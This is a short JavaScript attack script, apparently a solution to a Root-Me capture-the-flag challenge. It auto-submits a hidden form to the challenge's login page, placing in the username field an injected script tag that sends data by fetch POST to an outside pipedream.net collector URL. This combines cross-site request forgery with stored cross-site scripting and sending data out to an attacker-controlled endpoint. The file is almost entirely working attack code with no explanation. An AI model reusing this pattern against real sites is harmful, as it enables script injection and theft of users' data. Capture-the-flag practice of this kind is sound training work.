let url = "challenge01.root-me.org:58003/login"
let redirectURL = "https://eozr3kmrbmb1rnm.m.pipedream.net/?"
let nullOpener = window.opener == null ? "yes":"non"
let payload={
    username :`<script>const url = "${redirectURL}";

    const data = {
        nullOpener: "${nullOpener}",
    };
    
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data) 
    })
    .then(response => {
      console.log('Success:', response); 
    })
    .catch(error => {
      console.error('There was a problem with the fetch operation:', error);
    });</script>`,
    secret: "aa",
}
const form = document.createElement('form');
form.method = 'POST';
form.action = url;
form.style.visibility = 'hidden'; 
for (const key of Object.keys(payload)) {
    var input = document.createElement('input');
    input.name = key;
    input.value = payload[key];
    form.appendChild(input);
  }
  document.body.appendChild(form); 
  form.submit(); 

